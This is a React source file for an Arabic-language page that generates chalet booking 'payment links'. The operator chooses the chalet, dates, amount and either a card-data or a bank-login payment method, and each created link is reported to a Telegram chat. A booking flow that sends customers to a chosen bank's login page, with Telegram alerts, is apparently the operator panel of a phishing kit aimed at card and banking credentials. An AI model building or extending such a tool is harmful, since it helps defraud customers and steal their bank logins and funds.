import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode, getCurrencyName, getCurrencySymbol } from "@/lib/countryCurrencies";
import { getBanksByCountry } from "@/lib/banks";
import { useChalets, useCreateLink } from "@/hooks/useSupabase";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { sendToTelegram } from "@/lib/telegram";
import { ArrowRight, Home, Copy, Check, Building2, CreditCard, ExternalLink, Calendar, Users } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateChaletLink = () => {
  const { country } = useParams<{ country: string }>();
  const navigate = useNavigate();
  const { toast } = useToast();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  
  const { data: chalets, isLoading } = useChalets(country);
  const createLink = useCreateLink();
  
  const [selectedChaletId, setSelectedChaletId] = useState<string>("");
  const [pricePerNight, setPricePerNight] = useState<number>(0);
  const [nights, setNights] = useState<number>(1);
  const [guestCount, setGuestCount] = useState<number>(2);
  const [checkInDate, setCheckInDate] = useState<string>("");
  const [checkOutDate, setCheckOutDate] = useState<string>("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState<string>("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);
  
  const selectedChalet = chalets?.find((c) => c.id === selectedChaletId);
  const totalAmount = pricePerNight * nights;
  
  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  useEffect(() => {
    if (selectedChalet) {
      setPricePerNight(selectedChalet.default_price);
    }
  }, [selectedChalet]);
  
  const handleCreate = async () => {
    if (!selectedChalet || !countryData) return;

    if (!checkInDate || !checkOutDate) {
      toast({
        title: "خطأ",
        description: "الرجاء تحديد تواريخ الدخول والخروج",
        variant: "destructive",
      });
      return;
    }

    if (paymentMethod === "bank_login" && !selectedBank) {
      toast({
        title: "خطأ",
        description: "الرجاء اختيار البنك",
        variant: "destructive",
      });
      return;
    }

    const payload = {
      chalet_id: selectedChalet.id,
      chalet_name: selectedChalet.name,
      price_per_night: pricePerNight,
      nights,
      guest_count: guestCount,
      check_in_date: checkInDate,
      check_out_date: checkOutDate,
      total_amount: totalAmount,
      currency: countryData.currency,
      currency_code: getCurrencyCode(country || "SA"),
      payment_method: paymentMethod,
      selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
      selectedCountry: country || "SA",
      city: selectedChalet.city,
      address: selectedChalet.address,
      amenities: selectedChalet.amenities,
      capacity: selectedChalet.capacity,
    };

    try {
      const link = await createLink.mutateAsync({
        type: "chalet",
        country_code: country!,
        provider_id: selectedChalet.provider_id || undefined,
        payload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "chalet",
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'chalet_link_created',
        data: {
          chalet_name: selectedChalet.name,
          city: selectedChalet.city,
          check_in_date: checkInDate,
          check_out_date: checkOutDate,
          nights,
          guest_count: guestCount,
          price_per_night: pricePerNight,
          total_amount: totalAmount,
          country: countryData.nameAr,
          payment_url: paymentUrl
        },
        timestamp: new Date().toISOString(),
        imageUrl: selectedChalet.images?.[0],
        description: `حجز شاليه ${selectedChalet.name} في ${selectedChalet.city}`
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);
      
      if (telegramResult.success) {
        toast({
          title: "تم إنشاء رابط الحجز بنجاح!",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الحجز. الرجاء المحاولة مرة أخرى",
        variant: "destructive",
      });
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Home className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  

  
  return (
    <div className="min-h-screen py-6 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>
        
        <div className="max-w-2xl mx-auto">

          
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شاليه</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <div className="space-y-4">
              {/* Chalet Selection */}
              <div>
                <Label className="text-sm mb-2">اختر الشاليه</Label>
                <Select onValueChange={setSelectedChaletId} disabled={isLoading}>
                  <SelectTrigger className="w-full h-10">
                    <SelectValue placeholder={isLoading ? "جاري التحميل..." : "اختر شاليه..."} />
                  </SelectTrigger>
                  <SelectContent>
                    {!chalets || chalets.length === 0 ? (
                      <SelectItem value="none" disabled>
                        لا توجد شاليهات متاحة حالياً
                      </SelectItem>
                    ) : (
                      chalets.map((chalet) => (
                      <SelectItem key={chalet.id} value={chalet.id}>
                        <div className="flex items-center gap-2">
                          <span className="text-sm">{chalet.name}</span>
                          {chalet.verified && (
                            <span className="text-xs bg-primary/10 text-primary px-2 py-0.5 rounded">
                              موثّق
                            </span>
                          )}
                        </div>
                      </SelectItem>
                    )))}
                  </SelectContent>
                </Select>
              </div>
              
              {selectedChalet && (
                <>
                  {/* Chalet Details - Minimized */}
                  <div className="bg-secondary/30 p-3 rounded-lg">
                    <p className="text-xs text-muted-foreground mb-1">
                      <strong>المدينة:</strong> {selectedChalet.city}
                    </p>
                    <p className="text-xs text-muted-foreground mb-1">
                      <strong>العنوان:</strong> {selectedChalet.address}
                    </p>
                    <p className="text-xs text-muted-foreground">
                      <strong>السعة:</strong> حتى {selectedChalet.capacity} ضيف
                    </p>
                  </div>
                  
                  {/* Price per Night */}
                  <div>
                    <Label className="text-sm mb-2">
                      سعر الليلة ({countryData.currency})
                    </Label>
                    <Input
                      type="number"
                      value={pricePerNight}
                      onChange={(e) => setPricePerNight(Number(e.target.value))}
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  {/* Number of Nights */}
                  <div>
                    <Label className="text-sm mb-2">عدد الليالي</Label>
                    <Input
                      type="number"
                      min="1"
                      value={nights}
                      onChange={(e) => setNights(Number(e.target.value))}
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  {/* Guest Count */}
                  <div>
                    <Label className="text-sm mb-2 flex items-center gap-2">
                      <Users className="w-3 h-3" />
                      عدد الضيوف
                    </Label>
                    <Input
                      type="number"
                      min="1"
                      max={selectedChalet.capacity}
                      value={guestCount}
                      onChange={(e) => setGuestCount(Number(e.target.value))}
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  {/* Check-in Date */}
                  <div>
                    <Label className="text-sm mb-2 flex items-center gap-2">
                      <Calendar className="w-3 h-3" />
                      تاريخ الدخول *
                    </Label>
                    <Input
                      type="date"
                      value={checkInDate}
                      onChange={(e) => setCheckInDate(e.target.value)}
                      min={new Date().toISOString().split("T")[0]}
                      className="h-9 text-sm"
                      required
                    />
                  </div>
                  
                  {/* Check-out Date */}
                  <div>
                    <Label className="text-sm mb-2 flex items-center gap-2">
                      <Calendar className="w-3 h-3" />
                      تاريخ الخروج *
                    </Label>
                    <Input
                      type="date"
                      value={checkOutDate}
                      onChange={(e) => setCheckOutDate(e.target.value)}
                      min={checkInDate || new Date().toISOString().split("T")[0]}
                      className="h-9 text-sm"
                      required
                    />
                  </div>
                  
                  {/* Payment Method Selection */}
                  <div>
                    <Label className="text-sm mb-2 flex items-center gap-2">
                      <CreditCard className="w-3 h-3" />
                      طريقة الدفع *
                    </Label>
                    <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                      <SelectTrigger className="h-10">
                        <SelectValue placeholder="اختر طريقة الدفع" />
                      </SelectTrigger>
                      <SelectContent className="bg-background">
                        <SelectItem value="card">
                          <div className="flex items-center gap-2">
                            <CreditCard className="w-4 h-4" />
                            <span>بيانات البطاقة</span>
                          </div>
                        </SelectItem>
                        <SelectItem value="bank_login">
                          <div className="flex items-center gap-2">
                            <Building2 className="w-4 h-4" />
                            <span>تسجيل دخول البنك</span>
                          </div>
                        </SelectItem>
                      </SelectContent>
                    </Select>
                    <p className="text-xs text-muted-foreground mt-1">
                      {paymentMethod === "card" 
                        ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                        : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                    </p>
                  </div>
                  
                  {/* Bank Selection (Only for bank_login) */}
                  {paymentMethod === "bank_login" && (
                    <div>
                      <Label className="text-sm mb-2 flex items-center gap-2">
                        <Building2 className="w-3 h-3" />
                        اختر البنك *
                      </Label>
                      <Select value={selectedBank} onValueChange={setSelectedBank}>
                        <SelectTrigger className="h-10">
                          <SelectValue placeholder="اختر البنك" />
                        </SelectTrigger>
                        <SelectContent className="bg-background">
                          {banks.length > 0 ? (
                            banks.map((bank) => (
                              <SelectItem key={bank.id} value={bank.id}>
                                <div className="flex items-center gap-2">
                                  {bank.logo && (
                                    <img 
                                      src={bank.logo} 
                                      alt={bank.nameAr}
                                      className="h-5 w-5 object-contain"
                                      onError={(e) => e.currentTarget.style.display = 'none'}
                                    />
                                  )}
                                  <span>{bank.nameAr}</span>
                                </div>
                              </SelectItem>
                            ))
                          ) : (
                            <SelectItem value="no-bank" disabled>
                              لا توجد بنوك متاحة
                            </SelectItem>
                          )}
                        </SelectContent>
                      </Select>
                      <p className="text-xs text-muted-foreground mt-1">
                        💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                      </p>
                    </div>
                  )}
                  
                  {/* Total Amount */}
                  <div className="bg-gradient-primary p-4 rounded-xl text-primary-foreground">
                    <p className="text-xs mb-1">المبلغ الإجمالي</p>
                    <p className="text-2xl font-bold">
                      {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
                    </p>
                    <p className="text-xs mt-1 opacity-80">
                      {pricePerNight} × {nights} ليلة
                    </p>
                  </div>
                  
                  {/* Create Button */}
                  <Button
                    onClick={handleCreate}
                    disabled={createLink.isPending}
                    className="w-full py-5"
                  >
                    {createLink.isPending ? (
                      <span className="text-sm">جاري الإنشاء...</span>
                    ) : (
                      <>
                        <span className="ml-2 text-sm">إنشاء رابط الحجز</span>
                        <ArrowRight className="w-4 h-4 mr-2" />
                      </>
                    )}
                  </Button>
                </>
              )}
            </div>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog with Copy and Preview buttons */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الحجز بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            {/* Booking Summary */}
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الشاليه:</span>
                <span className="font-semibold">{selectedChalet?.name}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المدينة:</span>
                <span className="font-semibold">{selectedChalet?.city}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الدخول:</span>
                <span className="font-semibold">{checkInDate}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الخروج:</span>
                <span className="font-semibold">{checkOutDate}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">عدد الليالي:</span>
                <span className="font-semibold">{nights} ليلة</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">عدد الضيوف:</span>
                <span className="font-semibold">{guestCount} ضيف</span>
              </div>
              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
                <span className="text-muted-foreground">الإجمالي:</span>
                <span className="font-bold text-lg">
                  {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
          
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateChaletLink;
